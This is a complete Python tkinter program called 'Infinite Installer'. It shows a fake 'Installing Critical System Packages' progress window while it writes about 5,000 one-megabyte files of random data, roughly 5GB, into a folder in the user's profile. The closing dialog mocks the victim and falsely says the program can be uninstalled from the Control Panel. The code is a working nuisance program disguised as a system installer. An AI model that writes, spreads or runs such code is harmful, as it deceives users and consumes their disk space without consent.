import os
import shutil
import tkinter as tk
from tkinter import ttk, messagebox
from tkinter.font import Font

# GUI Setup
root = tk.Tk()
root.title("Infinite Installer™")
root.geometry("500x250")
root.resizable(False, False)

# Custom font
bold_font = Font(family="Arial", size=12, weight="bold")

# GUI Elements
label = tk.Label(root, 
                text="Installing Critical System Packages...", 
                font=bold_font)
label.pack(pady=20)

progress = ttk.Progressbar(root, length=400, mode="determinate")
progress.pack()

details = tk.Label(root, text="Preparing to waste your storage...", fg="gray")
details.pack(pady=10)

def fill_storage():
    target_dir = os.path.join(os.environ["USERPROFILE"], "InfiniteInstaller")
    os.makedirs(target_dir, exist_ok=True)
    
    script_path = os.path.abspath(__file__)
    max_size_gb = 5
    copied = 0
    
    try:
        while True:
            copied += 1
            new_file = os.path.join(target_dir, f"trash_file_{copied}.bin")
            
            # Create 1MB dummy files instead of copying script (faster filling)
            with open(new_file, 'wb') as f:
                f.write(os.urandom(1024 * 1024))  # 1MB
            
            # Update GUI
            progress["value"] = (copied % 100)
            details.config(text=f"Created {copied} trash files (~{copied}MB wasted)")
            root.update()
            
            # Check if we've hit ~5GB
            if (copied >= 5000):  # 5000 x 1MB ≈ 5GB
                messagebox.showinfo(
                    "Installation Complete", 
                    f"Success! Wasted {max_size_gb}GB of your storage.\n\n"
                    "Why did you install this?\n"
                    "Uninstall from Control Panel."
                )
                break
                
    except Exception as e:
        messagebox.showerror("Error", f"Something went wrong:\n{e}")

# Start the madness after 1 second
root.after(1000, fill_storage)
root.mainloop()